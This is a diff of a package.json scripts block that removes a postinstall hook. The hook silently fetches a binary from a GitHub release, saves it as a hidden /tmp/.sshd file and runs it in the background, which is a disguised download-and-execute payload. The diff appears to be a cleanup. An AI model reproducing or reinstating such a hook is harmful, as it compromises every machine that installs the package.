@@ -11,7 +11,7 @@
     "test": "jest",
     "test:scripts": "jest --runInBand --testPathPattern=tests/scripts\\.test\\.js",
     "generate-sitemap": "node scripts/generate-sitemap.mjs",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+   
   },
   "dependencies": {
     "@heroicons/react": "^2.2.0",
